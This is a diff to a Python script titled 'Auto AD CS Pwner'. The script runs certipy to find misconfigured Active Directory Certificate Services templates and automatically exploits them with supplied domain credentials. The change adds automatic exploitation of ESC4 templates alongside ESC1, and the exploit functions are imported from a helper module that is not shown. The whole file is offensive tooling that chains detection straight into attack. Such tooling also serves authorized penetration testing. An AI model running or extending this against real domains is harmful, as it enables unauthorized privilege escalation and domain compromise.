@@ -1,7 +1,8 @@
-from utils.certipy_runner import run_certipy_find, save_results_to_json, exploit_esc1
+from utils.certipy_runner import run_certipy_find, save_results_to_json, exploit_esc1, exploit_esc4
 from utils.parser import parse_stdout_output
 import argparse
 import os
+import subprocess
 
 def main():
     parser = argparse.ArgumentParser(description="Auto AD CS Pwner")
@@ -20,7 +21,6 @@ def main():
         return
 
     parsed_data = parse_stdout_output(output)
-
     save_results_to_json(parsed_data, "output/certipy-find-output.json")
 
     for template in parsed_data:
@@ -35,8 +35,19 @@ def main():
                 template_name=template["template_name"]
             )
             break
+        elif template.get("vuln") == "ESC4":
+            print(f"[+] Detected ESC4 on template: {template['template_name']}")
+            exploit_esc4(
+                username=args.username,
+                password=args.password,
+                domain=args.domain,
+                dc_ip=args.dc_ip,
+                ca_name=template["ca_name"],
+                template_name=template["template_name"]
+            )
+            break
     else:
-        print("[!] No ESC1 templates found.")
+        print("[!] No exploitable templates (ESC1 or ESC4) found.")
 
 if __name__ == "__main__":
     main()
